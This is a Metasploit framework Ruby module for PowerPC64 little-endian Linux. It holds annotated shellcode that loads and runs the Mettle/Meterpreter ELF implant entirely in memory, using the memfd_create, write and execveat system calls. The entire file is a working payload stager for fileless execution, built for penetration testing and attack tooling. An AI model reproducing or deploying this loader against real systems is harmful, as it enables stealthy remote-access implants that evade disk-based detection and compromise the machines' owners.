#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#

module Msf::Payload::Linux::Ppc64le::MeterpreterLoader
  def in_memory_load(payload)
    in_memory_loader = [
      #use branch and branch with link to get address of payload data
        0x5c000048, #0x1000:	b	0x105c	0x5c000048
        0xa602e87d, #0x1004:	mflr	r15	0xa602e87d
        0x0000c039, #0x1008:	li	r14, 0	0x0000c039
        0x0000c195, #0x100c:	stwu	r14, 0(r1)	0x0000c195
        0x780b237c, #0x1010:	mr	r3, r1	0x780b237c
        0x00008038, #0x1014:	li	r4, 0	0x00008038
        0x68010038, #0x1018:	li	r0, 0x168	0x68010038
        0x02000044, #0x101c:	sc		0x02000044
        0x787bf07d, #0x1020:	mr	r16, r15	0x787bf07d
        0x781b717c, #0x1024:	mr	r17, r3	0x781b717c
        0x0000af80, #0x1028:	lwz	r5, 0(r15)	0x0000af80
        0x0400ef39, #0x102c:	addi	r15, r15, 4	0x0400ef39
        0x787be47d, #0x1030:	mr	r4, r15	0x787be47d
        0x04000038, #0x1034:	li	r0, 4	0x04000038
        0x02000044, #0x1038:	sc		0x02000044
        0x788b237e, #0x103c:	mr	r3, r17	0x788b237e
        0x0000c195, #0x1040:	stwu	r14, 0(r1)	0x0000c195
        0x780b247c, #0x1044:	mr	r4, r1	0x780b247c
        0x7822857c, #0x1048:	xor	r5, r4, r4	0x7822857c
        0x782aa67c, #0x104c:	xor	r6, r5, r5	0x782aa67c
        0x0010e038, #0x1050:	li	r7, 0x1000	0x0010e038
        0x6a010038, #0x1054:	li	r0, 0x16a	0x6a010038
        0x02000044, #0x1058:	sc		0x02000044
        0xa9ffff4b, #0x105c:	bl	0x1004	0xa9ffff4b
        payload.length
    ].pack('V*')
    in_memory_loader
  end
end
